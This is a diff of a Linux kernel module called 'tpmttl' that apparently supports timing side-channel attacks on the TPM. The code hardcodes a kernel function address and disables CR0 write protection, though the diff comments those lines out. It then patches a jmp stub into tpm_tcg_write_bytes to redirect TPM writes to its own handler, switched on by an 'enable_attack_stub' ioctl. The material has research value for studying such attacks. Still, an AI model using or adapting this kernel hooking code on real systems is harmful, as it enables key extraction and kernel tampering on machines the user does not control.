@@ -3,13 +3,15 @@
 #include <linux/uaccess.h>
 #include <linux/io.h>
 #include <linux/fs.h>
-#include "tpmttl.h"
+#include <linux/tpm.h>
+
+#include "../tpmttl.h"
+
 
 unsigned long long ptpm_tcg_write_bytes = 0xffffffff81b2ef10;
 
-unsigned char  nop_stub[] = {0x90, 0x90, 0x90, 0x90, 0x90};
-unsigned char call_stub[] = {0xe8, 0xf1, 0xf2, 0xf3, 0xf4};
-unsigned char  jmp_stub[] = {0xe9, 0xf1, 0xf2, 0xf3, 0xf4};
+unsigned char nop_stub[] = {0x90, 0x90, 0x90, 0x90, 0x90};
+unsigned char jmp_stub[] = {0xe9, 0xf1, 0xf2, 0xf3, 0xf4};
 
 enum tis_status {
 	TPM_STS_VALID = 0x80,
@@ -65,12 +67,32 @@ struct tpm_tis_tcg_phy {
 
 #define	TPM_STS(l)			(0x0018 | ((l) << 12))
 
-enum tpm_chip_flags {
-  TPM_CHIP_FLAG_REGISTERED	= BIT(0),
-  TPM_CHIP_FLAG_TPM2		= BIT(1),
-  TPM_CHIP_FLAG_IRQ		= BIT(2),
-  TPM_CHIP_FLAG_VIRTUAL		= BIT(3),
+static const struct file_operations tpmttl_fops = {
+  .owner = THIS_MODULE,
+  .unlocked_ioctl = tpmttl_ioctl,
 };
+
+static struct miscdevice tpmttl_miscdev = {
+  .minor = MISC_DYNAMIC_MINOR,
+  .name = "tpmttl",
+  .fops = &tpmttl_fops,
+};
+
+#ifdef CONFIG_PREEMPT_RT
+static inline void tpm_tis_flush(void __iomem *iobase)
+{
+	ioread8(iobase + TPM_ACCESS(0));
+}
+#else
+#define tpm_tis_flush(iobase) do { } while (0)
+#endif
+
+static inline void tpm_tis_iowrite8(u8 b, void __iomem *iobase, u32 addr)
+{
+	iowrite8(b, iobase + addr);
+	tpm_tis_flush(iobase);
+}
+
 
 static noinline int internal_tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, const u8 *value, enum tpm_tis_io_mode io_mode);
 static int tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, const u8 *value, enum tpm_tis_io_mode io_mode);
@@ -83,7 +105,7 @@ static void enable_attack_stub()
   requestcnt = 0;
   unsigned int target_addr;
 
-  write_cr0(read_cr0() & (~X86_CR0_WP));
+  // write_cr0(read_cr0() & (~X86_CR0_WP));
 
   target_addr = tpm_tcg_write_bytes_handler - ptpm_tcg_write_bytes - 5;  
   jmp_stub[1] = ((char*)&target_addr)[0];
@@ -92,7 +114,7 @@ static void enable_attack_stub()
   jmp_stub[4] = ((char*)&target_addr)[3];
   memcpy((void*)ptpm_tcg_write_bytes, jmp_stub, sizeof(jmp_stub));
 
-  write_cr0(read_cr0() | X86_CR0_WP); 
+  // write_cr0(read_cr0() | X86_CR0_WP); 
 
   printk("TPMTTL: ENABLED\n");
 }
@@ -100,11 +122,11 @@ static void enable_attack_stub()
 
 static void disable_attack_stub()
 {  
-  write_cr0(read_cr0() & (~X86_CR0_WP));
+  // write_cr0(read_cr0() & (~X86_CR0_WP));
 
   memcpy((void*)ptpm_tcg_write_bytes, nop_stub, sizeof(nop_stub));
 
-  write_cr0(read_cr0() | X86_CR0_WP); 
+  // write_cr0(read_cr0() | X86_CR0_WP); 
 
   printk("TPMTTL: DISABLED\n");
 }
@@ -116,11 +138,13 @@ static long ioctl_uninstall_timer(struct file *filep, unsigned int cmd, unsigned
   return 0;
 }
 
+
 static long ioctl_install_timer(struct file *filep, unsigned int cmd, unsigned long arg)
 {
   enable_attack_stub();
   return 0;
 }
+
 
 static long ioctl_read(struct file *filep, unsigned int cmd, unsigned long arg)
 {
@@ -135,7 +159,9 @@ static long ioctl_read(struct file *filep, unsigned int cmd, unsigned long arg)
   return 0;
 }
 
+
 typedef long (*tpmttl_ioctl_t)(struct file *filep, unsigned int cmd, unsigned long arg);
+
 long tpmttl_ioctl(struct file *filep, unsigned int cmd, unsigned long arg)
 {
   struct tpmttl_generic_param data;
@@ -170,22 +196,6 @@ long tpmttl_ioctl(struct file *filep, unsigned int cmd, unsigned long arg)
 }
 
 
-#ifdef CONFIG_PREEMPT_RT
-static inline void tpm_tis_flush(void __iomem *iobase)
-{
-	ioread8(iobase + TPM_ACCESS(0));
-}
-#else
-#define tpm_tis_flush(iobase) do { } while (0)
-#endif
-
-static inline void tpm_tis_iowrite8(u8 b, void __iomem *iobase, u32 addr)
-{
-	iowrite8(b, iobase + addr);
-	tpm_tis_flush(iobase);
-}
-
-
 static noinline int internal_tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, const u8 *value, enum tpm_tis_io_mode io_mode)
 {
   unsigned long t;
@@ -215,18 +225,6 @@ static int tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 
 {
   return internal_tpm_tcg_write_bytes_handler(data, addr, len, value, io_mode);
 }
-
-
-static const struct file_operations tpmttl_fops = {
-  .owner = THIS_MODULE,
-  .unlocked_ioctl = tpmttl_ioctl,
-};
-
-static struct miscdevice tpmttl_miscdev = {
-  .minor = MISC_DYNAMIC_MINOR,
-  .name = "tpmttl",
-  .fops = &tpmttl_fops,
-};
 
 
 static int tpmttl_init(void)
